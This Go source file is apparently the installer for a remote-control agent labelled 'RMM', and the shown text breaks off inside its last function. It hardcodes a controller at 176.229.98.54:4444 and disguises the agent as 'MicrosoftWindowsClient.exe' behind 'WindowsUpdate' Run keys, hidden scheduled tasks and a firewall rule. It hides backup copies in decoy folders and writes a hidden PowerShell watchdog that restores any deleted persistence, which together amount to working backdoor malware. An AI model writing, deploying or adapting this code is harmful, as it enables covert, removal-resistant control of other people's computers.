package main

import (
	"bytes"
	"embed"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"rmm/internal/version"
)

//go:embed payload/*
var payloadFS embed.FS

func isAdmin() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func relaunchAsAdmin() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	params, _ := syscall.UTF16PtrFromString(strings.Join(os.Args[1:], " "))
	mod := syscall.NewLazyDLL("shell32.dll")
	mod.NewProc("ShellExecuteW").Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)),
		uintptr(unsafe.Pointer(params)), 0, 0)
	os.Exit(0)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// hideFile sets hidden+system attributes so the backup survives casual
// browsing and naive delete sweeps. Best effort; failures are ignored.
func hideFile(path string) {
	_, _ = exec.Command("attrib", "+h", "+s", path).CombinedOutput()
}

func saveHouse(path, addr string) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return
	}
	seen := map[string]bool{addr: true}
	houses := []string{addr + "\n"}
	if b, err := os.ReadFile(path); err == nil {
		for _, ln := range strings.Split(string(b), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") || seen[ln] {
				continue
			}
			seen[ln] = true
			houses = append(houses, ln+"\n")
		}
	}
	_ = os.WriteFile(path, []byte(strings.Join(houses, "")), 0644)
}

func install() {
	silent := false
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" {
			silent = true
		}
	}
	if !isAdmin() {
		relaunchAsAdmin()
		return
	}

	programFiles := os.Getenv("ProgramFiles")
	if programFiles == "" {
		programFiles = `C:\Program Files`
	}
	installDir := filepath.Join(programFiles, "RMM", "Agent")
	_ = os.MkdirAll(installDir, 0755)

	_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
	_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
	time.Sleep(1500 * time.Millisecond)

	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true}
	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel("payload", path)
		if skip[strings.ToLower(filepath.Base(rel))] {
			return nil
		}
		dest := filepath.Join(installDir, rel)
		_ = os.MkdirAll(filepath.Dir(dest), 0755)
		data, _ := fs.ReadFile(payloadFS, path)
		_ = os.WriteFile(dest, data, 0644)
		return nil
	})

	agentPath := filepath.Join(installDir, "MicrosoftWindowsClient.exe")
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		_ = filepath.Walk(installDir, func(p string, info os.FileInfo, err error) error {
			if err == nil && strings.EqualFold(filepath.Base(p), "MicrosoftWindowsClient.exe") {
				agentPath = p
			}
			return nil
		})
	}
	_ = os.Remove(filepath.Join(installDir, "agent.exe"))

	certPath := filepath.Join(installDir, "server.crt")

	controllerAddr := "176.229.98.54:4444"
	agentToken := ""
	for i, a := range os.Args {
		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
			controllerAddr = os.Args[i+1]
		} else if strings.HasPrefix(a, "-controller=") {
			controllerAddr = strings.TrimPrefix(a, "-controller=")
		} else if strings.HasPrefix(a, "--controller=") {
			controllerAddr = strings.TrimPrefix(a, "--controller=")
		} else if (a == "-token" || a == "--token") && i+1 < len(os.Args) {
			agentToken = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
		} else if strings.HasPrefix(a, "--token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
		}
	}
	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
	saveHouse(filepath.Join(installDir, "houses.txt"), controllerAddr)
	// Registration token: lets the controller tell managed agents apart
	// from rogue ones (empty = untokened, accepted unless enforced).
	tokenPath := filepath.Join(installDir, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(tokenPath, []byte(agentToken+"\n"), 0600)
		log.Printf("[*] Agent registration token stored")
	}

	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)

	// HKCU may fail when installer runs elevated - not critical
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdate", cmdLine); err != nil {
			log.Printf("[!] HKCU WindowsUpdate Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
		log.Printf("[*] HKLM WindowsUpdate Run key set")
	}

	// Stale-task sweep: detect legacy task pointing to pre-rename agent.exe.
	// schtasks /query /v reports the Task To Run value; if it mentions the
	// old name we log it explicitly so field techs can confirm the heal.
	if out, err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
		for _, ln := range strings.Split(string(out), "\n") {
			if strings.Contains(strings.ToLower(ln), "agent.exe") && !strings.Contains(strings.ToLower(ln), "microsoftwindowsclient") {
				log.Printf("[*] Stale task detected (points to old agent.exe), will replace: %s", strings.TrimSpace(ln))
				break
			}
		}
	} else {
		log.Printf("[*] No existing WindowsUpdate task (fresh install)")
	}
	_, _ = exec.Command("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()

	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT10M</Interval><Duration>P10675199DT2H48M05.4775807S</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure></Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>-controller %s -ca "%s"</Arguments></Exec></Actions>
</Task>`, agentPath, controllerAddr, certPath)

	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
		log.Printf("[!] Failed to create WindowsUpdate task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] WindowsUpdate task registered -> %s", agentPath)
	}
	_ = os.Remove(tmpTask)
	// Delete any legacy watchdog task before recreating below, so a stale
	// entry can never overlap with the new one.
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()

	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()

	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	blenderDir := filepath.Join(threeDObjects, "blender")
	_ = os.MkdirAll(blenderDir, 0755)
	// Second backup location: if one backup dir is wiped, the other still
	// heals the agent. Ordinary-looking system-ish path, hidden+system.
	backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
	if os.Getenv("APPDATA") == "" {
		backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
	}
	_ = os.MkdirAll(backupDir2, 0755)
	// Save the task XML next to the backup so the watchdog can re-create a
	// deleted scheduled task by itself (self-healing persistence).
	_ = os.WriteFile(filepath.Join(blenderDir, "agent_task.xml"), []byte(taskXML), 0644)

	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
	backupCert := filepath.Join(blenderDir, "server.crt")
	_ = copyFile(agentPath, backupAgent)
	_ = copyFile(certPath, backupCert)
	backupAgent2 := filepath.Join(backupDir2, "MicrosoftWindowsClient.exe")
	backupCert2 := filepath.Join(backupDir2, "server.crt")
	_ = copyFile(agentPath, backupAgent2)
	_ = copyFile(certPath, backupCert2)
	// Token travels with the backups (only when set - never create empties).
	backupToken := filepath.Join(blenderDir, "token.txt")
	backupToken2 := filepath.Join(backupDir2, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(backupToken, []byte(agentToken+"\n"), 0600)
		_ = os.WriteFile(backupToken2, []byte(agentToken+"\n"), 0600)
	} else {
		// Keep a previously-issued token across reinstalls that omit -token.
		if b, err := os.ReadFile(backupToken); err == nil && len(bytes.TrimSpace(b)) > 0 {
			_ = os.WriteFile(tokenPath, b, 0600)
			_ = os.WriteFile(backupToken2, b, 0600)
			log.Printf("[*] Kept existing registration token from backup")
		}
	}
	// version.txt next to binary AND both backups: watchdog restores only
	// when the backup is >= installed, so a bulk-updated agent is never
	// downgraded by a stale backup.
	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
	// Hidden+system attributes: invisible to casual browsing, blocks
	// shift-delete sweeps that skip system files.
	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2, backupToken, backupToken2} {
		hideFile(p)
	}

	watchdogScript := filepath.Join(blenderDir, "watchdog.ps1")
	watchdogLog := filepath.Join(blenderDir, "watchdog.log")
	psContent := "$ErrorActionPreference = \"Stop\"\n" +
		"$agentPath = \"" + agentPath + "\"\n" +
		"$controllerAddr = \"" + controllerAddr + "\"\n" +
		"$caPath = \"" + certPath + "\"\n" +
		"$installDir = \"" + installDir + "\"\n" +
		"$backupAgent = \"" + backupAgent + "\"\n" +
		"$backupCert = \"" + backupCert + "\"\n" +
		"$backupAgent2 = \"" + backupAgent2 + "\"\n" +
		"$backupCert2 = \"" + backupCert2 + "\"\n" +
		"$watchdogLog = \"" + watchdogLog + "\"\n" +
		"$watchdogSelf = $PSCommandPath\n" +
		"$healthyFile = Join-Path $env:LOCALAPPDATA \"RMM\\healthy\"\n" +
		"$prevExe = Join-Path \"" + installDir + "\" \"MicrosoftWindowsClient.prev.exe\"\n" +
		"$prevVerFile = Join-Path \"" + installDir + "\" \"version.prev.txt\"\n" +
		"$pendingFile = Join-Path \"" + installDir + "\" \"pending_update.json\"\n" +
		"$rollbackFile = Join-Path \"" + installDir + "\" \"rollback_notice.json\"\n" +
		"$tokenPath = Join-Path \"" + installDir + "\" \"token.txt\"\n" +
		"$backupToken = Join-Path (Split-Path \"" + backupAgent + "\") \"token.txt\"\n" +
		"$backupToken2 = Join-Path (Split-Path \"" + backupAgent2 + "\") \"token.txt\"\n\n" +
		"function Write-Log([string]$msg) {\n" +
		"    $line = \"[$(Get-Date -Format o)] $msg\"\n" +
		"    try {\n" +
		"        if ((Test-Path $watchdogLog) -and ((Get-Item $watchdogLog).Length -gt 5MB)) {\n" +
		"            Remove-Item ($watchdogLog + \".1\") -ErrorAction SilentlyContinue\n" +
		"            Rename-Item $watchdogLog (($watchdogLog | Split-Path -Leaf) + \".1\") -ErrorAction SilentlyContinue\n" +
		"        }\n" +
		"        Add-Content -Path $watchdogLog -Value $line\n" +
		"    } catch {}\n" +
		"    Write-Host $line\n" +
		"}\n\n" +
		"function Start-Agent {\n" +
		"    $psi = New-Object System.Diagnostics.ProcessStartInfo\n" +
		"    $psi.FilePath = $agentPath\n" +
		"    $psi.Arguments = \"-controller $controllerAddr -ca `\"$caPath`\"\"\n" +
		"    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden\n" +
		"    $psi.CreateNoWindow = $true\n" +
		"    $psi.UseShellExecute = $false\n" +
		"    [System.Diagnostics.Process]::Start($psi) | Out-Null\n" +
		"    Write-Log \"Started agent\"\n" +
		"}\n\n" +
		"function Test-Agent {\n" +
		"    $procs = @(Get-Process -Name \"MicrosoftWindowsClient\" -ErrorAction SilentlyContinue)\n" +
		"    return $procs.Count -gt 0\n" +
		"}\n\n" +
		"function Test-AgentHealthy {\n" +
		"    if (-not (Test-Path $healthyFile)) { return $false }\n" +
		"    try {\n" +
		"        $ts = [long](Get-Content $healthyFile -TotalCount 1)\n" +
		"        $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()\n" +
		"        return (($now - $ts) -lt 90)\n" +
		"    } catch { return $false }\n" +
		"}\n\n" +
		"function Get-Version([string]$dir) {\n" +
		"    $f = Join-Path $dir \"version.txt\"\n" +
		"    if (Test-Path $f) { return ((Get-Content $f -TotalCount 1).Trim()) }\n" +
		"    return \"\"\n" +
		"}\n\n" +
		"function Pick-Backup {\n" +
		"    foreach ($cand in @(@($backupAgent, $backupCert), @($backupAgent2, $backupCert2))) {\n" +
		"        if ((Test-Path $cand[0]) -and (Test-Path $cand[1])) { return $cand }\n" +
		"    }\n" +
		"    return $null\n" +
		"}\n\n" +
		"function Restore-Binary {\n" +
		"    if (-not (Test-Path $agentPath)) {\n" +
		"        $src = Pick-Backup\n" +
		"        if ($null -eq $src) { Write-Log \"Agent binary missing AND both backups gone - cannot restore\"; return }\n" +
		"        $instVer = Get-Version $installDir\n" +
		"        $bakVer = Get-Version (Split-Path $src[0])\n" +
		"        if ($bakVer -ne \"\" -and $instVer -ne \"\" -and ($bakVer -lt $instVer)) {\n" +
		"            Write-Log \"Backup v$bakVer older than installed v$instVer - skipping restore (bulk update in flight)\"\n" +
		"            return\n" +
		"        }\n" +
		"        Write-Log \"Agent binary missing, restoring from backup...\"\n" +
		"        $dir = Split-Path $agentPath\n" +
		"        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }\n" +
		"        Copy-Item -Path $src[0] -Destination $agentPath -Force\n" +
		"        Copy-Item -Path $src[1] -Destination $caPath -Force\n" +
		"        $bv = Get-Version (Split-Path $src[0])\n" +
		"        if ($bv -ne \"\") { Set-Content -Path (Join-Path $installDir \"version.txt\") -Value ($bv + \"`n\") }\n" +
		"        Write-Log \"Binary + cert restored\"\n" +
		"    }\n" +
		"    if ((-not (Test-Path $tokenPath)) -and (Test-Path $backupToken)) {\n" +
		"        try { Copy-Item -Path $backupToken -Destination $tokenPath -Force; Write-Log \"Restored registration token\" } catch {}\n" +
		"    }\n" +
		"    # Re-sync a wiped backup location from the surviving one.\n" +
		"    if ((-not (Test-Path $backupAgent)) -and (Test-Path $backupAgent2)) {\n" +
		"        try { Copy-Item -Path $backupAgent2 -Destination $backupAgent -Force; Copy-Item -Path $backupCert2 -Destination $backupCert -Force; if (Test-Path $backupToken2) { Copy-Item -Path $backupToken2 -Destination $backupToken -Force }; Write-Log \"Re-synced primary backup from secondary\" } catch {}\n" +
		"    } elseif ((-not (Test-Path $backupAgent2)) -and (Test-Path $backupAgent)) {\n" +
		"        $d2 = Split-Path $backupAgent2\n" +
		"        if (-not (Test-Path $d2)) { New-Item -ItemType Directory -Path $d2 -Force | Out-Null }\n" +
		"        try { Copy-Item -Path $backupAgent -Destination $backupAgent2 -Force; Copy-Item -Path $backupCert -Destination $backupCert2 -Force; if (Test-Path $backupToken) { Copy-Item -Path $backupToken -Destination $backupToken2 -Force }; Write-Log \"Re-synced secondary backup from primary\" } catch {}\n" +
		"    }\n" +
		"}\n\n" +
		"function Ensure-Persistence {\n" +
		"    # If someone deletes our Run keys / scheduled tasks, put them back.\n" +
		"    try {\n" +
		"        $rk = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n" +
		"        $want = \"`\"$agentPath`\" -controller $controllerAddr -ca `\"$caPath`\"\"\n" +
		"        $cur = (Get-ItemProperty -Path $rk -Name \"WindowsUpdate\" -ErrorAction SilentlyContinue).\"WindowsUpdate\"\n" +
		"        if ($cur -ne $want) { Set-ItemProperty -Path $rk -Name \"WindowsUpdate\" -Value $want; Write-Log \"Repaired HKLM Run WindowsUpdate\" }\n" +
		"        $wwant = \"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `\"$watchdogSelf`\"\"\n" +
		"        $wcur = (Get-ItemProperty -Path $rk -Name \"WindowsUpdateWatchdog\" -ErrorAction SilentlyContinue).\"WindowsUpdateWatchdog\"\n" +
		"        if ($wcur -ne $wwant) { Set-ItemProperty -Path $rk -Name \"WindowsUpdateWatchdog\" -Value $wwant; Write-Log \"Repaired HKLM Run WindowsUpdateWatchdog\" }\n" +
		"    } catch {}\n" +
		"    $pairs = @(@(\"WindowsUpdate\", \"agent_task.xml\"), @(\"WindowsUpdateWatchdog\", \"watchdog_task.xml\"))\n" +
		"    foreach ($p in $pairs) {\n" +
		"        schtasks /query /tn $p[0] 2>&1 | Out-Null\n" +
		"        if ($LASTEXITCODE -ne 0) {\n" +
		"            $xml = Join-Path (Split-Path $watchdogSelf) $p[1]\n" +
		"            if (Test-Path $xml) {\n" +
		"                schtasks /create /tn $p[0] /xml $xml /f 2>&1 | Out-Null\n" +
		"                Write-Log \"Re-created task $($p[0])\"\n" +
		"            } else { Write-Log \"Task $($p[0]) missing and no saved XML to rebuild it\" }\n" +
		"        }\n" +
		"    }\n" +
		"}\n\n" +
		"function Note-Restart {\n" +
		"    # Count only deaths of a previously-alive agent (a wiped binary\n" +
		"    # being re-restored is not a crash loop).\n" +
		"    $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()\n" +
		"    $script:crashTimes = @($script:crashTimes | Where-Object { ($now - $_) -lt 600 })\n" +
		"    $script:crashTimes += $now\n" +
		"}\n\n" +
		"function Maybe-Rollback {\n" +
		"    # A fresh update that crash-loops (>=3 watchdog restarts in 10\n" +
		"    # minutes while a differing prev backup exists) gets unwound to\n" +
		"    # prev. The agent reports it on next hello; the controller\n" +
		"    # alarms and holds the bad version back.\n" +
		"    if ($script:crashTimes.Count -lt 3) { return }\n" +
		"    $verNow = Get-Version $installDir\n" +
		"    $prevVer = \"\"\n" +
		"    if (Test-Path $prevVerFile) { $prevVer = ((Get-Content $prevVerFile -TotalCount 1).Trim()) }\n" +
		"    if ($verNow -eq \"\" -or $prevVer -eq \"\" -or $prevVer -eq $verNow) { return }\n" +
		"    if (-not (Test-Path $prevExe)) { return }\n" +
		"    Write-Log \"Update v$verNow crash-looped ($($script:crashTimes.Count) restarts in 10min) - rolling back to v$prevVer\"\n" +
		"    Get-Process -Name \"MicrosoftWindowsClient\" -ErrorAction SilentlyContinue | Stop-Process -Force\n" +
		"    Start-Sleep -Seconds 2\n" +
		"    Copy-Item -Path $prevExe -Destination $agentPath -Force\n" +
		"    Set-Content -Path (Join-Path $installDir \"version.txt\") -Value ($prevVer + \"`n\")\n" +
		"    $notice = (@{bad = $verNow; to = $prevVer; at = [DateTime]::UtcNow.ToString(\"o\")} | ConvertTo-Json -Compress)\n" +
		"    Set-Content -Path $rollbackFile -Value $notice\n" +
		"    Remove-Item $pendingFile -ErrorAction SilentlyContinue\n" +
		"    $script:crashTimes = @()\n" +
		"    Write-Log \"Rolled back to v$prevVer - agent will notify the controller on next hello\"\n" +
		"    Start-Agent\n" +
		"}\n\n" +
		"# Initial start if not running\n" +
		"if (-not (Test-Agent)) { Restore-Binary; Start-Agent }\n\n" +
		"# Monitor loop - process existence + health staleness, every 30 seconds;\n" +
		"# persistence self-heal every 10th pass (~5 minutes).\n" +
		"$loop = 0\n" +
		"$script:crashTimes = @()\n" +
		"$wasAlive = Test-Agent\n" +
		"while ($true) {\n" +
		"    Start-Sleep -Seconds 30\n" +
		"    $loop++\n" +
		"    if (-not (Test-Agent)) {\n" +
		"        if ($wasAlive) { Note-Restart }\n" +
		"        Write-Log \"Agent process missing, restarting...\"\n" +
		"        Restore-Binary\n" +
		"        Start-Agent\n" +
		"        Maybe-Rollback\n" +
		"        $wasAlive = $true\n" +
		"    } elseif (-not (Test-AgentHealthy)) {\n" +
		"        Note-Restart\n" +
		"        Write-Log \"Agent process hung (healthy stale >90s), killing + restarting...\"\n" +
		"        Get-Process -Name \"MicrosoftWindowsClient\" -ErrorAction SilentlyContinue | Stop-Process -Force\n" +
		"        Start-Sleep -Seconds 2\n" +
		"        Restore-Binary\n" +
		"        Start-Agent\n" +
		"        Maybe-Rollback\n" +
		"        $wasAlive = $true\n" +
		"    } else { $wasAlive = $true }\n" +
		"    if (($loop % 10) -eq 0) { Ensure-Persistence }\n" +
		"}\n"
	_ = os.WriteFile(watchdogScript, []byte(psContent), 0644)

	cmdWatchdog := exec.Command("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", watchdogScript)
	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmdWatchdog.Start()

	watchdogRunCmd := fmt.Sprintf(`powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"`, watchdogScript)
	// HKCU may fail when installer runs elevated (writes to admin's HKCU, not user's) - not critical, HKLM is primary
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd); err != nil {
			log.Printf("[!] HKCU watchdog Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence - survives reboots for all users
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd)
		k.Close()
		log.Printf("[*] HKLM watchdog Run key set")
	}

	createWatchdogTask(watchdogScript)

	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmd.Start()

	if !silent {
		fmt.Println("Agent installed to", installDir)
	}
}

func main() {
	wantUninstall := false
	confirmed := false
	for i, a := range os.Args {
		if a == "--uninstall" {
			wantUninstall = true
		}
		if (a == "--confirm" && i+1 < len(os.Args) && strings.EqualFold(os.Args[i+1], "YES")) || strings.EqualFold(a, "--confirm=YES") {
			confirmed = true
		}
	}
	if wantUninstall {
		// Friction against casual/accidental removal: the flag alone is
		// not enough. Legit removal: --uninstall --confirm YES
		if !confirmed {
			fmt.Println("Refusing to uninstall without explicit confirmation.")
			fmt.Println("Usage: Agent-Setup.exe --uninstall --confirm YES")
			os.Exit(2)
		}
		programFiles := os.Getenv("ProgramFiles")
		if programFiles == "" {
			programFiles = `C:\Program Files`
		}
		installDir := filepath.Join(programFiles, "RMM", "Agent")
		if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			k.Close()
		}
		if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			k.Close()
		}
		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
		blenderDir := filepath.Join(threeDObjects, "blender")
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
			_ = os.RemoveAll(blenderDir)
			// Update-rollback leftovers next to the installed binary.
			_ = os.Remove(filepath.Join(installDir, "MicrosoftWindowsClient.prev.exe"))
			_ = os.Remove(filepath.Join(installDir, "version.prev.txt"))
			_ = os.Remove(filepath.Join(installDir, "pending_update.json"))
			_ = os.Remove(filepath.Join(installDir, "rollback_notice.json"))
			_ = os.Remove(filepath.Join(installDir, "token.txt"))
			_ = os.Remove(filepath.Join(blenderDir, "token.txt"))
		// Second backup location (v1.40.6+).
		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
		if os.Getenv("APPDATA") == "" {
			backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
		}
		_ = os.RemoveAll(backupDir2)
		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
			_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
		}
		_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
		_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
		// Kill watchdog by command-line match (window title is unreliable when hidden).
		_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
		_ = os.RemoveAll(installDir)
		fmt.Println("Agent uninstalled.")
		os.Exit(0)
	}
	install()
}

func createWatchdogTask(scriptPath string) {
	// Use schtasks like the main task - more reliable than COM
	watchdogTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"</Arguments></Exec></Actions>
</Task>`, scriptPath)

	// Keep a copy beside the watchdog script so Ensure-Persistence can
	// rebuild a deleted task without the installer.
	_ = os.WriteFile(filepath.Join(filepath.Dir(scriptPath), "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
